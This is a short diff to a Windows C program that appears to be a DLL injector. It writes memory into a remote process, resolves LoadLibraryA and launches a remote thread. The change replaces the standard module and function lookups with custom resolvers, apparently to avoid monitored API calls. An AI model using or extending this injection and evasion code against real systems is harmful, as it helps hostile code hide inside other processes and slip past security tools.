@@ -1,7 +1,10 @@
 #include<stdio.h>
 #include<Windows.h>
+#include<winternl.h>
 #include<String.h>
 #include "header.h"
+
+
 INT main(int argc, const char* argv[]) {
 
 	if (argc < 3) {
@@ -34,10 +37,14 @@ INT main(int argc, const char* argv[]) {
 	}
 	printf("[+]0x%p has been written to with %d of memory!\n", remoteMemory,lpNumberOfBytesWritten);
 	//get handle to loadlibraryA
-	HMODULE k32 = GetModuleHandleA("kernel32.dll");
+	HMODULE k32 = returnModuleHandle(L"kernel32.dll");
+	if (!k32) {
+		printf("[!] Error! with returnLoadLibrary\n");
+		return ERROR;
+	}
 	PVOID pfnLoadLibraryA = returnGetProcAddress(k32,"LoadLibraryA");
 	if (!pfnLoadLibraryA) {
-		printf("[!] Error! with GetProcAddress, GetLastError() = %d\n", GetLastError());
+		printf("[!] Error! with returnGetProcAddress\n");
 		return ERROR;
 	}
 	printf("[!]Launching thread!\n");
